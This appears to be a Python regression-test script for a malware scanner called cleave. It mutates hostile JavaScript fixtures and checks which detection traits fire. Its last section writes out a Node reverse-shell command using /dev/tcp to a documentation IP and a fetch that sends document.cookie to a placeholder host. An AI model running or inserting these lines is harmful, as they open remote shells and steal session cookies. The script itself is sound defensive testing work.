#!/usr/bin/env python3
"""Check raw permutation-loader evidence without relying on a payload decoder."""
import argparse
import base64
import json
from pathlib import Path
import re
import subprocess
import tempfile


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--cleave', default='../cleave/target/release/cleave')
    parser.add_argument('--traits-dir', help='Use an isolated rule snapshot')
    args = parser.parse_args()
    root = Path(__file__).resolve().parents[2]
    cleave = str(Path(args.cleave).resolve())
    traits = str(Path(args.traits_dir).resolve()) if args.traits_dir else str(root)
    source = (root / 'testdata/hostile/generated/javascript-good-triage/permutation-loader.js').read_text()
    protected = re.compile(r'''"(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])*'|//[^\n]*|/\*[\s\S]*?\*/|\b[A-Za-z_$][\w$]*\b|\s+''')
    names = {'pHg', 'Rjb', 'Abp', 'QbC', 'duZ', 'yCZ', 'pPW', 'fqw', 'zlJ', 'siM', 'mZw'}
    renamed = protected.sub(lambda m: 'local_' + m[0] if m[0] in names else m[0], source)
    def compact(match):
        text = match[0]
        if text.startswith(('//', '/*')):
            return ' '
        return ' ' if text.isspace() else text
    compacted = protected.sub(compact, renamed)
    split = source.index('global["_V"]')
    cases = {
        'original.js': source,
        'renamed.js': renamed,
        'compacted.js': compacted,
        'dot-global.js': source.replace('global["r"] = require;', 'global.importer = require;'),
        'globalthis.js': source.replace('global["r"] = require;', 'globalThis.importer = require;'),
        'no-final-call.js': source.replace('zlJ(5164);', ''),
        'replaced-factory.js': source.replace('var yCZ = QbC;', 'var yCZ = other;'),
        'wrong-decoder.js': source.replace('var fqw = pPW(', 'var fqw = other('),
        'reassigned-stage.js': source.replace('zlJ(5164);', 'zlJ = other; zlJ(5164);'),
        'wrong-stage-call.js': source.replace('zlJ(5164);', 'other(5164);'),
        'module-result-alias.js': source.replace('global["r"] = require;', 'global["r"] = require("fs");'),
        'quoted-require-alias.js': source.replace('global["r"] = require;', 'const note = "global[\\\"r\\\"] = require;";'),
        'plain-utility.js': source[:split],
        'quoted-source.js': 'const documentation = ' + json.dumps(source) + ';',
        'detached-from-export.js': source[split:] + '\nmodule.exports=function utility(){};\n(function(){return 0;})();',
        'literal-factory-key.js': re.sub(r'var Rjb = .*?;', 'var Rjb = "constructor";', source),
    }
    with tempfile.TemporaryDirectory(prefix='javascript-good-review-') as work:
        stage = Path(work)
        for name, body in cases.items():
            (stage / name).write_text(body)
        result = subprocess.run([cleave, '--traits-dir', traits, '--format', 'jsonl', *map(str, sorted(stage.iterdir()))], capture_output=True, text=True, check=True)
        assert 'skipped' not in result.stderr.lower(), result.stderr
        reports = [json.loads(line) for line in result.stdout.split('\n') if line]
        files = {Path(r['files'][0]['path']).name: r['files'][0] for r in reports}
        def ids(name, level=None):
            return {t['id'] for t in files[name].get('traits', []) if level is None or t['crit'] == level}
        execute = 'objectives/execution/payload/script-eval/transformed::node-permuted-code-factory-stage'
        append = 'objectives/supply-chain/hidden-payload/runtime::exported-module-appended-permutation-stage'
        conceal = 'objectives/anti-static/obfuscation/eval/function::node-code-factory-hidden-by-permuted-key'
        positives = ['original.js', 'renamed.js', 'compacted.js', 'dot-global.js', 'globalthis.js']
        for name in positives:
            assert {execute, append, conceal} <= ids(name, 5), (name, ids(name, 5))
        for name in set(cases) - set(positives) - {'detached-from-export.js', 'literal-factory-key.js'}:
            assert not {execute, append, conceal} & ids(name), (name, ids(name))
        assert execute in ids('detached-from-export.js', 5)
        assert append not in ids('detached-from-export.js')
        assert {execute, append} <= ids('literal-factory-key.js', 5)
        assert conceal not in ids('literal-factory-key.js')
    print(f'Raw JavaScript good-triage regressions passed: {len(cases)} controls; sample code not executed')

    fixtures = root / 'testdata'
    controls = sorted((fixtures / 'notable/generated/javascript-good-triage').glob('*.js'))
    controls += sorted((fixtures / 'suspicious/generated/javascript-good-triage').glob('*.js'))
    controls += [fixtures / 'hostile/generated/javascript-good-triage/cookie-live.js']
    result = subprocess.run([cleave, '--traits-dir', traits, '--format', 'jsonl', *map(str, controls)], capture_output=True, text=True, check=True)
    assert 'skipped' not in result.stderr.lower(), result.stderr
    files = {Path(r['files'][0]['path']).name: r['files'][0] for r in map(json.loads, filter(None, result.stdout.split('\n')))}
    for path in controls:
        high = {t['id'] for t in files[path.name].get('traits', []) if t['crit'] >= 4}
        if path.name == 'cookie-live.js':
            assert 'objectives/exfiltration/stealer/application-state/cookie::document-cookie-external-fetch-url' in high
        elif path.name == 'reverse-live.js':
            assert high == {'objectives/anti-static/obfuscation/string/reverse::js-reverse-string-obfuscation'}, high
        elif path.name == 'brand-host-prefix.js':
            assert high == {'objectives/command-and-control/infrastructure/domain/brand-impersonation::brand-tech-vercel'}, high
        else:
            assert not high, (path.name, high)
    print(f'Taxonomy relationship regressions passed: {len(controls)} controls')

    native = (fixtures / 'hostile/generated/javascript-good-triage/browser-vbscript-native-dropper.js').read_text()
    variants = {
        'active.js': native,
        'quoted.js': 'const example=' + json.dumps(native) + ';',
        'not-a-browser-write.js': native.replace('w.document.write(', 'logger.note('),
        'not-vbscript.js': native.replace('language="Vbs"', 'language="text"'),
        'not-a-pe-array.js': native.replace('array(77,90,144,0', 'array(77,91,144,0'),
    }
    nested = 'objectives/anti-static/obfuscation/payload/code-in-data::browser-builds-vbscript-native-payload-dropper'
    with tempfile.TemporaryDirectory(prefix='browser-native-review-') as work:
        stage = Path(work)
        for name, text in variants.items():
            (stage / name).write_text(text)
        result = subprocess.run([cleave, '--traits-dir', traits, '--format', 'jsonl', *map(str, sorted(stage.iterdir()))], capture_output=True, text=True, check=True)
        assert 'skipped' not in result.stderr.lower(), result.stderr
        for report in map(json.loads, filter(None, result.stdout.split('\n'))):
            file = report['files'][0]
            found = {t['id'] for t in file.get('traits', []) if t['crit'] == 5}
            assert (nested in found) == (Path(file['path']).name == 'active.js'), (file['path'], found)
    print(f'Nested browser payload regressions passed: {len(variants)} controls')

    emoji = (fixtures / 'hostile/generated/javascript-good-triage/emoji-nested-data-loader.js').read_text()
    uri = re.search(r'data:text/javascript;base64,[A-Za-z0-9+/=]+', emoji)[0]
    def uri_for(program):
        return 'data:text/javascript;base64,' + base64.b64encode(program.encode()).decode()
    def remote_uri(host):
        html = f'<script src="http://{host}/changed.js"></script>'
        escaped = ''.join('%%%02X' % byte for byte in html.encode())
        return uri_for('document.write(unescape(' + repr(escaped) + '));')
    local_names = {'getCookie', 'src', 'now', 'cookie', 'time', 'date'}
    renamed = protected.sub(lambda m: 'local_' + m[0] if m[0] in local_names and not emoji[:m.start()].rstrip().endswith('.') else m[0], emoji)
    cases = {
        'original.js': emoji,
        'renamed.js': renamed,
        'changed-ip.js': emoji.replace(uri, remote_uri('198.51.100.25')),
        'changed-domain.js': emoji.replace(uri, remote_uri('different-endpoint.invalid')),
        'harmless-data.js': emoji.replace(uri, uri_for('console.log("hello");')),
        'inert-encoded-markup.js': emoji.replace(uri, uri_for('console.log("%3C%73%63%72%69%70%74%20%68%74%74%70%3A%2F%2F");')),
        'quoted.js': 'const documentation=' + json.dumps(emoji) + ';',
        'disjoint-gate.js': emoji.replace("document.write('<script src=", "console.log('<script src=") + '\ndocument.write(\'<script src="\'+src+\'"></script>\');',
    }
    delivered = 'objectives/command-and-control/dropper/delivery/web-injection::emoji-frontend-cookie-gated-data-script'
    numeric = 'objectives/anti-static/obfuscation/multi-layer::injected-frontend-concealed-numeric-script-host'
    with tempfile.TemporaryDirectory(prefix='emoji-stage-review-') as work:
        stage = Path(work)
        for name, text in cases.items():
            (stage / name).write_text(text)
        result = subprocess.run([cleave, '--traits-dir', traits, '--format', 'jsonl', *map(str, sorted(stage.iterdir()))], capture_output=True, text=True, check=True)
        assert 'skipped' not in result.stderr.lower(), result.stderr
        for report in map(json.loads, filter(None, result.stdout.split('\n'))):
            file = report['files'][0]
            name = Path(file['path']).name
            found = {t['id'] for t in file.get('traits', []) if t['crit'] == 5}
            assert (delivered in found) == (name in {'original.js', 'renamed.js', 'changed-ip.js', 'changed-domain.js'}), (name, found)
            assert (numeric in found) == (name in {'original.js', 'renamed.js', 'changed-ip.js'}), (name, found)
    print(f'Encoded frontend regressions passed: {len(cases)} controls')

    command = 'require("child_process").execSync("bash -i >& /dev/tcp/203.0.113.7/4444 0>&1");'
    cookie = 'fetch("https://example.test/collect?c="+document.cookie);'
    cases = {
        'node-root.js': command,
        'node-function-only.js': 'function launch(){' + command + '}',
        'node-safe-command.js': 'require("child_process").execSync("echo hello");',
        'cookie-root.js': cookie,
        'cookie-function-only.js': 'function send(){' + cookie + '}',
        'cookie-safe-fetch.js': 'fetch("https://example.test/collect?c=public");',
    }
    automatic = 'objectives/execution/interpreter/script/initialization::'
    with tempfile.TemporaryDirectory(prefix='initialization-review-') as work:
        stage = Path(work)
        for name, text in cases.items():
            (stage / name).write_text(text)
        result = subprocess.run([cleave, '--traits-dir', traits, '--format', 'jsonl', *map(str, sorted(stage.iterdir()))], capture_output=True, text=True, check=True)
        assert 'skipped' not in result.stderr.lower(), result.stderr
        for report in map(json.loads, filter(None, result.stdout.split('\n'))):
            file = report['files'][0]
            name = Path(file['path']).name
            found = {t['id'] for t in file.get('traits', []) if t['crit'] == 5}
            assert any(id.startswith(automatic) for id in found) == (name in {'node-root.js', 'cookie-root.js'}), (name, found)
            if 'function-only' in name:
                assert found, (name, found)
            if 'safe-' in name:
                assert not found, (name, found)
    print(f'Initialization regressions passed: {len(cases)} controls')


if __name__ == '__main__':
    main()
